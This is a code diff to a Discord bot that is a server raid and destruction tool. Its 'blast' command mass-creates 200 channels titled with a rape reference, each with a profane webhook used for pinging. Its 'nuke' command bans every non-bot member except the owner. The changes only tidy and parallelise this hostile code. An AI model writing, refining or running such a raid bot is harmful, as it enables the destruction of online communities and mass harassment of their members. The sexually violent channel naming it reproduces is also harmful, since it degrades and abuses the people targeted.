@@ -1,3 +1,4 @@
+require('dotenv').config();
 const express = require('express');
 const {
   Client,
@@ -8,14 +9,12 @@ const {
   Routes,
   PermissionFlagsBits,
   ChannelType,
-  WebhookClient,
 } = require('discord.js');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (_, res) => res.send('Bot is online'));
-app.listen(PORT, () => console.log(`🌐 Web active on port ${PORT}`));
+app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));
 
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
@@ -25,6 +24,7 @@ const client = new Client({
 client.once('ready', async () => {
   console.log(`🤖 Logged in as ${client.user.tag}`);
 
+  // Register slash commands globally
   const commands = [
     new SlashCommandBuilder()
       .setName('blast')
@@ -39,35 +39,37 @@ client.once('ready', async () => {
   ];
 
   const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
-  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
-
-  console.log('✅ Slash commands registered');
+  try {
+    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
+    console.log('✅ Slash commands registered globally');
+  } catch (error) {
+    console.error('Error registering commands:', error);
+  }
 });
 
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
-  const guild = interaction.guild;
-  if (!guild) return interaction.reply({ content: '❌ Use this command in a server.', ephemeral: true });
+  if (!interaction.guild) return interaction.reply({ content: '❌ Use commands in a server.', ephemeral: true });
 
   if (interaction.user.id !== process.env.OWNER_ID) {
-    return interaction.reply({ content: '❌ You are not allowed.', ephemeral: true });
+    return interaction.reply({ content: '❌ You are not authorized.', ephemeral: true });
   }
 
   if (interaction.commandName === 'blast') {
-    await interaction.reply('🚀 Creating 200 channels + webhooks and pinging...');
+    await interaction.reply('🚀 Creating 200 channels and webhooks...');
 
     const promises = [];
     for (let i = 1; i <= 200; i++) {
       promises.push(
         (async () => {
           try {
-            const channel = await guild.channels.create({
-              name: `raped-by-vanir`
+            const channel = await interaction.guild.channels.create({
+              name: `raped-by-vanir`,
               type: ChannelType.GuildText,
             });
 
             const webhook = await channel.createWebhook({
-              name: `get fucked`,
+              name: `getfucked`,
               avatar: client.user.displayAvatarURL(),
             });
 
@@ -78,36 +80,39 @@ client.on('interactionCreate', async (interaction) => {
 
             console.log(`✅ Created and pinged vanir-${i}`);
           } catch (e) {
-            console.error(`❌ Error at vanir-${i}:`, e.message);
+            console.error(`❌ Error on vanir-${i}: ${e.message}`);
           }
         })()
       );
     }
 
     await Promise.allSettled(promises);
-    interaction.followUp('✅ Blast completed.');
+    interaction.followUp('✅ Blast complete.');
   }
 
   if (interaction.commandName === 'nuke') {
-    await interaction.reply('💣 Nuking members...');
+    await interaction.reply('💣 Banning all non-bot members except owner...');
 
-    const members = await guild.members.fetch();
-    for (const [id, member] of members) {
-      if (id === process.env.OWNER_ID || member.user.bot) continue;
+    const members = await interaction.guild.members.fetch();
+    const bans = [];
 
-      try {
-        await member.ban({ reason: 'Nuke' });
-        console.log(`🔨 Banned ${member.user.tag}`);
-      } catch (e) {
-        console.error(`❌ Couldn’t ban ${member.user.tag}:`, e.message);
-      }
-    }
+    members.forEach((member) => {
+      if (member.user.bot || member.id === process.env.OWNER_ID) return;
+      bans.push(
+        member.ban({ reason: 'Nuke command' }).then(() => {
+          console.log(`🔨 Banned ${member.user.tag}`);
+        }).catch((e) => {
+          console.error(`❌ Failed to ban ${member.user.tag}: ${e.message}`);
+        })
+      );
+    });
 
+    await Promise.allSettled(bans);
     interaction.followUp('✅ Nuke complete.');
   }
 });
 
-process.on('unhandledRejection', (err) => console.error('Unhandled:', err));
-process.on('uncaughtException', (err) => console.error('Exception:', err));
+process.on('unhandledRejection', (err) => console.error('UnhandledRejection:', err));
+process.on('uncaughtException', (err) => console.error('UncaughtException:', err));
 
 client.login(process.env.TOKEN);
